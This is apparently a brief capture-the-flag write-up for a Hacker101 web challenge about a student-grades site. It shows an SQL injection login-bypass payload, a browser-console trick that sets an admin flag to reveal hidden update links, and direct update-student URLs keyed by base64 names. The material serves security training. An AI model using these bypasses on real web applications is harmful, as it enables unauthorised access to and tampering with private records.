# OSU CTF

- Platform: Hacker101 <br>
- Category: Web  <br>
- Difficulty: Moderate  <br>

## Flag0 
Hints:
- Always check the JS on the page for unlinked routes!

``` admin' or '1'='1 ```
<img width="1912" height="840" alt="image" src="https://github.com/user-attachments/assets/6bfb2215-0e3f-493e-b5d0-298c9db5faed" />
<img width="1918" height="302" alt="image" src="https://github.com/user-attachments/assets/89bb677d-3998-4216-9249-16133576736b" />

```
(function(s, objectName) {
    setupLinks = function() {
        if (s.admin) {
            var sl = document.getElementsByClassName("student-link");
            for (i = 0; i < sl.length; i++) {
                let name = sl[i].innerHTML;
                sl[i].style.cursor = 'pointer';
                sl[i].addEventListener("click", function() {
                    window.location = '/update-' + objectName + '/' + this.dataset.id;
                });
            }
        }
    };
    updateForm = function() {
        var submitButton = document.getElementsByClassName("update-record");
        if (submitButton.length === 1) {
            submitButton[0].addEventListener("click", function() {
                var english = document.getElementById("english");
                english = english.options[english.selectedIndex].value;
                var science = document.getElementById("science");
                science = science.options[science.selectedIndex].value;
                var maths = document.getElementById("maths");
                maths = maths.options[maths.selectedIndex].value;
                var grades = new Set(["A", "B", "C", "D", "E", "F"]);
                if (grades.has(english) && grades.has(science) && grades.has(maths)) {
                    document.getElementById('student-form').submit();
                } else {
                    alert('Grades should only be between A - F');
                }
            });
        }
    };
    setupLinks();
    updateForm();
})(staff, 'student');
```





```
console.log(window.staff.admin)
staff.admin = true;
setupLinks();
```

<img width="837" height="315" alt="image" src="https://github.com/user-attachments/assets/6450905e-8a03-402d-ae60-e7d919ae2574" />

``` https://d2a549eebd3c50530dc427f7b64e9350.ctf.hacker101.com/update-student/TmFuY2llX0JyZXR0 ```

<img width="1918" height="581" alt="image" src="https://github.com/user-attachments/assets/6fa20906-fa31-4dab-a1d2-3880314c899b" />


```https://d2a549eebd3c50530dc427f7b64e9350.ctf.hacker101.com/update-student/TmF0YXNoYV9EcmV3```






<img width="1083" height="492" alt="image" src="https://github.com/user-attachments/assets/1ffc0b8a-fd87-49c4-b6d1-6d2d57e98a2e" />
<img width="1087" height="515" alt="image" src="https://github.com/user-attachments/assets/8bd26af4-7d5d-4e67-85e2-107fd45aa5b8" />
<img width="1083" height="573" alt="image" src="https://github.com/user-attachments/assets/b3d524e0-c4fa-4cf5-a9e4-41c95f76a8a6" />

